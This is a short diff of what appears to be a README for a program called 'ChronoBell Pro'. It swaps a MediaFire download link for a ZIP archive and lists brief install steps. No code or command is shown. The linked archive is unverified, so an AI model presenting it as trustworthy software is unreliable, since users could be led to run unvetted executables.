@@ -41,7 +41,7 @@ Modern. Powerful. Beautiful.
 
 ---
 ## Releases
-- Download - https://www.mediafire.com/file/mm03jy9i1tgov39/ChronoBell_Pro.zip/file
+- Download - https://www.mediafire.com/file/eae85w4z2wtbjwv/ChronoBell_Pro.zip/file
 ### How To Install
 1. Extract the ZIP
 2. Open 'Release' folder inside the 'ChronoBell Pro' folder
